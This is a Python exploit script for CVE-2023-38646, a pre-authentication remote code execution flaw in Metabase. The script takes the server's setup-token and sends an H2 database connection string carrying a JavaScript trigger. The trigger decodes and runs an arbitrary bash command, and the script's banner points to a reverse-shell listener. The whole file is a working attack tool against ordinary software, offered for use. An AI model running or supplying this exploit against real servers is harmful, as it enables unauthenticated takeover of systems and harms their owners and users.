from argparse import ArgumentParser
from string import ascii_uppercase
import requests
import json
import time
import base64
import random

parser = ArgumentParser('Metabase Pre-Auth RCE Reverse Shell', 'This script causes a server running Metabase (< 0.46.6.1 for open-source edition and < 1.46.6.1 for enterprise edition) to execute a command through the security flaw described in CVE 2023-38646')

parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
parser.add_argument('-c', '--command', type=str, required=True, help='Command to be execute in the target host')

args = parser.parse_args()

print('[*] ENSURE YOU HAVE A LISTENER ACTIVE IF YOU ARE ISSUING COMMANDS FOR REVERSE SHELL [*]\n')
print('[+] Initialized script')
print('[+] Obtaining setup-token')
time.sleep(1)

def fetch_webpage(url):
    response = requests.get(url)
    if response.status_code == 200:
        webpage_content = response.text
        return webpage_content
    else:
        print(f"[-] Failed to obtain setup-token\n")
        return None

def b64_encode(command):
    encoded_payload = base64.b64encode(command.encode('ascii')).decode()
    equals_count = encoded_payload.count('=')

    if equals_count >= 1:
        encoded_payload = base64.b64encode(f'{command + " " * equals_count}'.encode('ascii')).decode()

    return encoded_payload

webpage_content = fetch_webpage(args.url + '/api/session/properties')

if webpage_content != None:
    data = json.loads(webpage_content)
    token = data["setup-token"]
    print(f'[+] Successfully obtained setup-token: {token}')
    time.sleep(1)
else:
    print('[-] Exiting...')
    exit

print('[+] Encoding command')
url = f'{args.url}/api/setup/validate'

command = b64_encode(args.command)


headers = {
    "Content-Type": "application/json",
    "Connection": "close"
}

payload = {
    "token": token,
    "details": {
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_string} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x".format(random_string = ''.join(random.choice(ascii_uppercase) for i in range(12)), command=command),
            "advanced-options": False,
            "ssl": True
        },
        "name": "x",
        "engine": "h2"
    }
}

print('[+] Making request')

request = requests.post(url, json=payload, headers=headers)

print('[+] Payload sent')
